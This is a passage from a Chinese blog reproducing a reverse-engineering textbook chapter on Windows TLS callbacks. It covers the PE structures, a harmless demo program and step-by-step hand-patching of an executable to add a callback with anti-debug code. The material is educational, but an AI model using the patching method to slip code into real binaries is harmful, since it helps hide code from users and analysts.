Table）项目，如下图所示（IMAGE_NT_HEADERS-IMAGE_OPTIONAL_HEADER-IMAGE_DATA_DIRECTORY[9]）。</p><p>如图45-4所示，IMAGE_TLS_DIRECTORY结构体位于RVA 9310地址处。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220319200634646.png#alt=image-20220319200634646"></p><h2 id="45-2-2-IMAGE-TLS-DIRECTORY"><a href="#45-2-2-IMAGE-TLS-DIRECTORY" class="headerlink" title="45.2.2 IMAGE TLS DIRECTORY"></a>45.2.2 IMAGE TLS DIRECTORY</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_TLS_DIRECTORY64</span> &#123;</span><br>    ULONGLONG   StartAddressOfRawData;<br>    ULONGLONG   EndAddressOfRawData;<br>    ULONGLONG   AddressOfIndex;         <span class="hljs-comment">// PDWORD</span><br>    ULONGLONG   AddressOfCallBacks;     <span class="hljs-comment">// PIMAGE_TLS_CALLBACK *;</span><br>    DWORD   SizeOfZeroFill;<br>    DWORD   Characteristics;<br>&#125; IMAGE_TLS_DIRECTORY64;<br><span class="hljs-keyword">typedef</span> IMAGE_TLS_DIRECTORY64 * PIMAGE_TLS_DIRECTORY64;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_TLS_DIRECTORY32</span> &#123;</span><br>    DWORD   StartAddressOfRawData;<br>    DWORD   EndAddressOfRawData;<br>    DWORD   AddressOfIndex;             <span class="hljs-comment">// PDWORD</span><br>    DWORD   AddressOfCallBacks;         <span class="hljs-comment">// PIMAGE_TLS_CALLBACK *</span><br>    DWORD   SizeOfZeroFill;<br>    DWORD   Characteristics;<br>&#125; IMAGE_TLS_DIRECTORY32;<br><span class="hljs-keyword">typedef</span> IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br><span class="hljs-keyword">typedef</span> IMAGE_THUNK_DATA64              IMAGE_THUNK_DATA;<br><span class="hljs-keyword">typedef</span> PIMAGE_THUNK_DATA64             PIMAGE_THUNK_DATA;<br><span class="hljs-keyword">typedef</span> IMAGE_TLS_DIRECTORY64           IMAGE_TLS_DIRECTORY;<br><span class="hljs-keyword">typedef</span> PIMAGE_TLS_DIRECTORY64          PIMAGE_TLS_DIRECTORY;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">typedef</span> IMAGE_THUNK_DATA32              IMAGE_THUNK_DATA;<br><span class="hljs-keyword">typedef</span> PIMAGE_THUNK_DATA32             PIMAGE_THUNK_DATA;<br><span class="hljs-keyword">typedef</span> IMAGE_TLS_DIRECTORY32           IMAGE_TLS_DIRECTORY;<br><span class="hljs-keyword">typedef</span> PIMAGE_TLS_DIRECTORY32          PIMAGE_TLS_DIRECTORY;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>IMAGE_TLS_DIRECTORY结构体有2种版本，分别为32位版本与64位版本，以上练习示例中使用的是32位版本的结构体（大小为18h）。使用PEView工具査看IMAGE_TLS_DIRECTORY结构体（RVA: 9310），其各成员如图45-5所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220319201216231.png#alt=image-20220319201216231"></p><p>代码逆向分析中涉及的比较重要的成员为Address Of Callbacks，该值指向含有TLS回调函数地址（VA）的数组。这意味着可以向同一程序注册多个TLS回调函数（数组以NULL值结束）。</p><h2 id="45-2-3回调函数地址数组"><a href="#45-2-3回调函数地址数组" class="headerlink" title="45.2.3回调函数地址数组"></a>45.2.3回调函数地址数组</h2><p>图45-6就是TLS回调函数地址数组。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220319203822181.png#alt=image-20220319203822181"></p><p>该数组中实际存储的就是TLS回调函数的地址。进程启动运行时，（执行EP代码前）系统会逐一调用存储在该数组中的函数。请注意，虽然以上练习示例中仅注册了 1个TLS函数（地址为401000），但其实我们可以通过修改程序注册多个TLS函数。</p><h1 id="45-3-TLS回调函数"><a href="#45-3-TLS回调函数" class="headerlink" title="45.3 TLS回调函数"></a>45.3 TLS回调函数</h1><p>接下来从技术层面简单整理之前介绍的TLS回调函数相关内容。</p><blockquote><p>所谓TLS回调函数是指，每当创建&#x2F;终止进程的线程时会自动调用执行的函数。有意思的是，创建进程的主线程时也会自动调用回调函数，且其调用执行先于EP代码。反调试技术利用的就是TLS回调函数的这一特征。</p></blockquote><p>请注意，创建或终止某线程时，TLS回调函数都会自动调用执行，前后共2次（原意即为此）。执行进程的主线程（运行进程的EP代码）前，TLS回调函数会先被调用执行，许多逆向分析人员将该特征应用于程序的反调试技术。</p><p>IMAGE_TLS_CALLBACK</p><p>TLS回调函数的定义如代码45-2所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">VOID</span><br><span class="hljs-params">(NTAPI *PIMAGE_TLS_CALLBACK)</span> <span class="hljs-params">(</span><br><span class="hljs-params">    PVOID DllHandle,</span><br><span class="hljs-params">    DWORD Reason,</span><br><span class="hljs-params">    PVOID Reserved</span><br><span class="hljs-params">    )</span>;<br></code></pre></td></tr></table></figure><p>仔细观察TLS回调函数的定义可以发现，它与DllMain()函数的定义类似。代码45-3是DllMain()函数的定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(</span><br><span class="hljs-params">    HINSTANCE hinstDLL, </span><br><span class="hljs-params">    DWORD fdwReason, </span><br><span class="hljs-params">    LPVOID lpvReserved</span><br><span class="hljs-params">)</span><br></code></pre></td></tr></table></figure><p>观察以上2个函数可以发现，它们的参数顺序与含义都是一样的。其中，参数DllHandle为模块句柄（即加载地址），参数Reason表示调用TLS回调函数的原因，具体原因有4种，如代码45-4所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> DLL_PROCESS_ATTACH   1    </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DLL_THREAD_ATTACH    2    </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DLL_THREAD_DETACH    3    </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DLL_PROCESS_DETACH   0</span><br></code></pre></td></tr></table></figure><p>要想准确理解TLS回调函数的工作原理（在哪个时间点调用哪个回调函数），最好的方法就是亲自创建。接下来做第二个练习示例，以进一步学习TLS回调函数的工作原理。</p><h1 id="45-4-练习-2-TlsTest-exe"><a href="#45-4-练习-2-TlsTest-exe" class="headerlink" title="45.4 练习 #2: TlsTest.exe"></a>45.4 练习 #2: TlsTest.exe</h1><p>TlsTest.exe程序是使用Visual C++编写的，它向各位充分展现了注册TLS回调函数的方法。代 码45-5（TlsTest.cpp）是TlsTest.exe程序的源代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/INCLUDE:__tls_used&quot;</span>) <span class="hljs-comment">//告诉链接器要使用TLS</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_console</span><span class="hljs-params">(<span class="hljs-type">char</span>* szMsg)</span><br>&#123;<br>    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);<br><br>    WriteConsoleA(hStdout, szMsg, <span class="hljs-built_in">strlen</span>(szMsg), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">void</span> NTAPI <span class="hljs-title function_">TLS_CALLBACK1</span><span class="hljs-params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span><br>&#123;<br>    <span class="hljs-type">char</span> szMsg[<span class="hljs-number">80</span>] = &#123;<span class="hljs-number">0</span>,&#125;;<br>    wsprintfA(szMsg, <span class="hljs-string">&quot;TLS_CALLBACK1() : DllHandle = %X, Reason = %d\n&quot;</span>, DllHandle, Reason);<br>    print_console(szMsg);<br>&#125;<br><br><span class="hljs-type">void</span> NTAPI <span class="hljs-title function_">TLS_CALLBACK2</span><span class="hljs-params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span><br>&#123;<br>    <span class="hljs-type">char</span> szMsg[<span class="hljs-number">80</span>] = &#123;<span class="hljs-number">0</span>,&#125;;<br>    wsprintfA(szMsg, <span class="hljs-string">&quot;TLS_CALLBACK2() : DllHandle = %X, Reason = %d\n&quot;</span>, DllHandle, Reason);<br>    print_console(szMsg);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">注册TLS函数  </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">但是只规定了回调函数的地址以及函数在那个节区</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">#pragma comment(linker,&quot;/INCLUDE:__tls_used&quot;)这条语句的作用就是告诉链接器.CRT$XLY里有回调函数的地址，来调用吧 </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">.CRT$XLX的作用 </span><br><span class="hljs-comment">CRT表示使用C Runtime 机制</span><br><span class="hljs-comment">X表示表示名随机 L表示TLS Callback section </span><br><span class="hljs-comment">X也可以换成B~Y任意一个字符 </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span> <br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg(<span class="hljs-string">&quot;.CRT$XLX&quot;</span>)</span><br>    PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, TLS_CALLBACK2, <span class="hljs-number">0</span> &#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg()</span><br><br>DWORD WINAPI <span class="hljs-title function_">ThreadProc</span><span class="hljs-params">(LPVOID lParam)</span><br>&#123;<br>    print_console(<span class="hljs-string">&quot;ThreadProc() start\n&quot;</span>);<br><br>    print_console(<span class="hljs-string">&quot;ThreadProc() end\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    HANDLE hThread = <span class="hljs-literal">NULL</span>;<br><br>    print_console(<span class="hljs-string">&quot;main() start\n&quot;</span>);<br><br>    hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    WaitForSingleObject(hThread, <span class="hljs-number">60</span>*<span class="hljs-number">1000</span>);<br>    CloseHandle(hThread);<br><br>    print_console(<span class="hljs-string">&quot;main() end\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>TlsTest.cpp源代码中注册了2个TLS回调函数（TLS_CALLBACK1、TLS_CALLBACK2）。它们也非常简单，只是将DllHandle与Reason这2个参数的值输出到控制台，然后终止退出。main()函数也非常简单，创建用户线程（ThreadProc）后终止，main()与ThreadProc()内部分别将函数开始&#x2F;终止日志输岀到控制台。图45-7是TlsTest.exe程序运行的画面。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220319205909450.png#alt=image-20220319205909450"></p><p>下面分别讲解各函数调用顺序。</p><h2 id="45-4-1-DLL-PROCESS-ATTACH"><a href="#45-4-1-DLL-PROCESS-ATTACH" class="headerlink" title="45.4.1 DLL_PROCESS_ATTACH"></a>45.4.1 DLL_PROCESS_ATTACH</h2><p>进程的主线程调用main()函数前，已经注册的TLS回调函数（TLS_CALLBACK1、TLS_CALLBACK2）会先被调用执行，此时Reason的值为 1（DLL_PROCESS_ATTACH）。</p><h2 id="45-4-2-DLL-THREAD-ATTACH"><a href="#45-4-2-DLL-THREAD-ATTACH" class="headerlink" title="45.4.2 DLL_THREAD_ATTACH"></a>45.4.2 DLL_THREAD_ATTACH</h2><p>所有TLS回调函数完成调用后，main()函数开始调用执行，创建用户线程（ThreadProc）前，TLS回调函数会被再次调用执行，此时Reason&#x3D;2（DLL_THREAD_ATTACH）。</p><h2 id="45-4-3-DLL-THREAD-DETACH"><a href="#45-4-3-DLL-THREAD-DETACH" class="headerlink" title="45.4.3 DLL_THREAD_DETACH"></a>45.4.3 DLL_THREAD_DETACH</h2><p>TLS回调函数全部执行完毕后，ThreadProc()线程函数开始调用执行。其执行完毕后Reason&#x3D;3（DLL_THREAD_DETACH），TLS回调函数被调用执行。</p><h2 id="45-4-4-DLL-PROCESS-DETACH"><a href="#45-4-4-DLL-PROCESS-DETACH" class="headerlink" title="45.4.4 DLL_PROCESS_DETACH"></a>45.4.4 DLL_PROCESS_DETACH</h2><p>ThreadProc()线程函数执行完毕后，一直在等待线程终止的main()函数（主线程）也会终止。</p><p>此时Reason&#x3D;0（DLL_PROCESS_DETACH）, TLS回调函数最后一次被调用执行。以上TlsTest.exe练习示例中，2个TLS回调函数分别被调用执行了4次，总共为8次。现在我们已经对TLS回调函数的注册及工作原理有了深入了解。接下来学习其调试方法。</p><blockquote><p>TlsTest.cpp源文件中并未使用printf()函数，因为开启特定编译选项（&#x2F;MT）编译源 程序时，先于主线程调用执行的TLS回调函数中<strong>可能</strong>发生Run-Time Error（运行时错误）。此时可以直接调用WriteConsole() API来以防万一。</p></blockquote><h1 id="45-5-调试TLS回调函数"><a href="#45-5-调试TLS回调函数" class="headerlink" title="45.5 调试TLS回调函数"></a>45.5 调试TLS回调函数</h1><p>若直接使用调试器打开带有TLS回调函数的程序，则无法调试TLS回调函数，因为TLS回调函数在EP代码之前就被调用执行了。练习示例#1文件（HdloTls.exe）中，TLS回调函数内部还含有反调试代码，这使程序调试无法继续。如图45-8所示，此时修改OllyDbg选项就可以调试TLS回调函数。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220319210838572.png#alt=image-20220319210838572"></p><p>然后重启调试器重新调试HelloTls.exe,调试器就会在ntdll.dll模块内部的“System Startup Breakpoint”处暂停，如图45-9所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220319211052234.png#alt=image-20220319211052234"></p><p>调试器暂停的位置即是系统启动断点（System Startup Breakpoint）0在OllyDbg调试器的默认设置下，调试器会在EP处暂停，而WinDbg调试器默认在系统启动断点暂停。</p><p>参考图45-5与图45-6获取TLS回调函数的地址，然后在回调函数的起始地址设置好断点，这样就可以调试TLS回调函数了。</p><p>使用特定调试器插件（如Oily Advanced）时，存在一个“暂停在TLS回调函数”的选项，使用起来更加方便。此外，最新版本的OllyDbg（版本2.0以上）默认提供“暂停在TLS回调函数”的选项，如图45-10所示</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220319210716336.png#alt=image-20220319210716336"></p><p>请各位亲自调试HelloTls.exe的TLS回调函数。</p><h1 id="45-6-手工添加TLS回调函数"><a href="#45-6-手工添加TLS回调函数" class="headerlink" title="45.6 手工添加TLS回调函数"></a>45.6 手工添加TLS回调函数</h1><p>我比较喜欢翻看并修改PE文件，借助几种工具（OllyDbg、PEView、HxD）,我们可以随心所欲地修改PE文件。本节的目标是直接修改Hello.exe文件（PE文件），为其添加TLS回调函数，使之与前面介绍的HelloTls.exe练习文件具有类似的行为功能。下面向大家介绍手工修改PE文件并添加TLS回调函数的过程。</p><blockquote><p>随心所欲地修改PE文件前，需要了解PE文件格式相关知识，并通过大量练习来熟悉它们。此外，不同版本WindowsOS的PE装栽器的行为动作会有细微差别，反复练习即可逐渐掌握。</p></blockquote><h2 id="45-6-1修改前的原程序"><a href="#45-6-1修改前的原程序" class="headerlink" title="45.6.1修改前的原程序"></a>45.6.1修改前的原程序</h2><p>修改前的原程序为Hello.exe，它非常简单，运行时弹出一个消息框，然后终止退岀，如图45-11所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220320103201630.png#alt=image-20220320103201630"></p><p>我们的目标是手工修改原程序文件，添加TLS回调函数，使之与HelloTls.exe具有类似行为。</p><h2 id="45-6-2设计规划"><a href="#45-6-2设计规划" class="headerlink" title="45.6.2设计规划"></a>45.6.2设计规划</h2><p>首先要确定IMAGE_TLS_DIRECTORY结构体与TLS回调函数放到文件的哪个位置。向某个 PE文件添加代码或数据时，有如下3种方法来查找合适位置：</p><p>第一，添加到节区末尾的空白区域。</p><p>第二，增加最后一个节区的大小。</p><p>第三，在最后添加新节区。</p><p>这里采用第二种方法，即增加最后一个节区的大小（参考图45-14）。使用PEView查看Hello.exe文件最后一个节区（.rsrc）的节区头（请注意，Hello.exe的Section Alignments1000，File Alignment&#x3D;200），如图45-12所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220320103437666.png#alt=image-20220320103437666"></p><p>可以看到，最后一个节区（.rsrc）的Pointer to Raw Data&#x3D;9000，Size of Raw Data&#x3D;200。所以PE头中定义的文件整体大小为9200。考虑到要添加的代码与数据的大小，我们将最后一个节区的大小增加200（文件的大小增加到9400）。使用010Editor工具打开Hello.exe文件，移动光标至最后位置，在菜单栏中选择Edit-Insert bytes菜单，打开插入字节对话框。如图45-13所示，向Bytecount中输入200,单击OK按钮后，即从光标的当前位置新添加了200h个字节（即512个字节）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220320103744452.png#alt=image-20220320103744452"></p><blockquote><p>图45-12中Virtual Size为1B4，PE装载器会按照Section Alignment值对齐该值，即加载到内存中的大小为1000（一定要理解好这个关系）。所以将节区的文件大小增加200后，实际Virtual Size值变为3B4，它比加栽到内存中的尺寸1000要小，所以不需要再单独增大Virtual Size的值。不增大Virtual Size的值同样不会影响增加的200h字节被复制到内存镜像中（Virtual Size只会只会影响对齐后的大小！！！）。</p></blockquote><h2 id="45-6-3编辑PE文件头"><a href="#45-6-3编辑PE文件头" class="headerlink" title="45.6.3编辑PE文件头"></a>45.6.3编辑PE文件头</h2><p><strong>.rsrc节区头</strong></p><p>请参考图45-12，分别修改.rsrc节区头中Size of Raw Data与Characteristics的值，即Size of Raw Data&#x3D;400、Characteristics&#x3D;E0000060，如图45-15所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220320104534185.png#alt=image-20220320104534185"></p><p>在原有属性的基础上新增加了 IMAGE_SCN_CNT_CODE|IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEMWRITE属性。</p><blockquote><p>由于要在扩展区域内创建IMAGE_TLS_DIRECTORY结构体与TLS回调函数，所 以需要向该节区添加 IMAGE_SCN_CNT_CODE|IMAGE_SCN_MEM_EXECUTE 属性。此外，还必须向包含IMAGE_TLS_DIRECTORY结构体的节区添加IMAGE_SCN_MEM WRITE属性，才能保证正常运行。</p></blockquote><p><strong>IMAGE_DATA_DIRECTORY[9]</strong></p><p>接下来要设置TLS表（IMAGE_NT_HEADERS-IMAGE_OPTIONAL_HEADER-IMAGE_DATA_DIRECOTRY[9]）的值。从图45-14中可以看到，扩展区域的起始地址为9200（文件偏移）。在PEView中查看该地址为C200（RVA地址），我们将从该地址处创建IMAGE_TLS_DIRECTORY结构体。因此修改PE文件头中的IMAGE_DATA_DIRECTORY[9]，如图45-17所示（RVA&#x3D;C200, Size&#x3D;18）。</p><p>修改后用PEView工具查看，如图45-18所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220320105007757.png#alt=image-20220320105007757"></p><h2 id="45-6-4-设置-IMAGE-TLS-DIRECTORY-结构体"><a href="#45-6-4-设置-IMAGE-TLS-DIRECTORY-结构体" class="headerlink" title="45.6.4 设置 IMAGE_TLS_DIRECTORY 结构体"></a>45.6.4 设置 IMAGE_TLS_DIRECTORY 结构体</h2><p>接下来设置IMAGE_TLS_DIRECTORY结构体，只要把TLS回调函数注册到其中即可。编辑设置IMAGE_TLS_DIRECTORY结构体，如图45-19所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220320163011907.png#alt=image-20220320163011907"></p><p>我们在文件偏移9200（RVA C200）地址处创建了 IMAGE_TLS_DIRECTORY结构体。AddressOfCallbacks成员的值为VA 40C224（文件偏移9224），它是Array ofTLS Callback Function（TLS回调函数数组）的起始地址。只要把TLS回调函数的地址（40C230）放入该数组（VA：40C224,Offset: 9224）,即可成功注册TLS回调函数。使用PEView工具查看设置后的IMAGE_TLS_DIRECTORY结构体，如图45-20所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220320164711491.png#alt=image-20220320164711491"></p><p>先向TLS回调函数写入“C2 0C00 - RETN 0C”命令，即在TLS回调函数中不执行任何操作，直接返回。</p><blockquote><p>TLS回调函数的返回指令不是RETN，而是RETN 0C指令，因为函数有3个参数（大小为0C）,所以需要修正栈，修正大小为0C。现在运行修改后的Hello.exe文件，若修改没有问题，则能正常运行。</p></blockquote><h2 id="45-6-5-编写TLS回调函数"><a href="#45-6-5-编写TLS回调函数" class="headerlink" title="45.6.5 编写TLS回调函数"></a>45.6.5 编写TLS回调函数</h2><p>上述准备工作全部完成后，接下来编写TLS回调函数3利用OllyDbg的汇编功能，从40C230地址处开始编写反调试代码，如图45-21所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220320195223999.png#alt=image-20220320195223999"></p><p>如图45-21所示，编写好TLS回调函数后，将修改的代码与数据全部选中（40C230~40C291），在鼠标右键中依次选择Copy to executable-Selection - Save file菜单，保存为ManualHelloTls.exe文件。</p><p>下面简单讲解TLS回调函数的代码。Reason参数值为1（DLL_PROCESS_ATTACH）时，检 查PEB.BeingDebugged成员，若处于调试状态，则弹岀消息框（MessageBoxA）后终止并退岀进程（ExitProcess）。阅读代码时，参考代码注释就很容易把握代码结构。此外还要注意，传递给MessageBoxA()函数的2个字符串参数分别存储在40C270与40C280地址处。</p><blockquote><p>MessageBoxA()与 ExitProcess() API 的 IAT 地址（分别为4080E8与408028）使用原 Hello.exe 的 IAT 中的即可。在OllyDbg 的 Assemble 对话框中，以 “CALL user32 .MessageBoxA”、“CALLKemel32.ExitProcess” 形式输入就可以了。OllyDbg调试器会</p></blockquote><p>自动求得API的地址并输入结果。如果要调用的API不在IAT中，那么编写代码时要复杂得多。</p><h2 id="45-6-6最终完成"><a href="#45-6-6最终完成" class="headerlink" title="45.6.6最终完成"></a>45.6.6最终完成</h2><p>在OllyDbg中打开并运行上面编写的ManualHelloTls.exe文件时，弹岀“Debugger Detected!”消息框，如图45-22所示，单击“确定”后，程序终止运行，这表明手工添加TLS回调函数成功通过手动方式向PE文件添加TLS回调函数的练习到此结束。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220320201239401.png#alt=image-20220320201239401"></p><h1 id="45-7小结"><a href="#45-7小结" class="headerlink" title="45.7小结"></a>45.7小结</h1><p>本章我们学习了TLS回调函数的工作原理及具体实现方法，并了解了其调试方法。TLS回调函数常用于反调试，请各位务必掌握本章知识。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第44章 InjDILexe： DLL注入专用工具</title>
    <link href="/1999/04/04/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC44%E7%AB%A0%20InjDll.exe%EF%BC%9ADLL%E6%B3%A8%E5%85%A5%E4%B8%93%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
    <url>/1999/04/04/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC44%E7%AB%A0%20InjDll.exe%EF%BC%9ADLL%E6%B3%A8%E5%85%A5%E4%B8%93%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
    
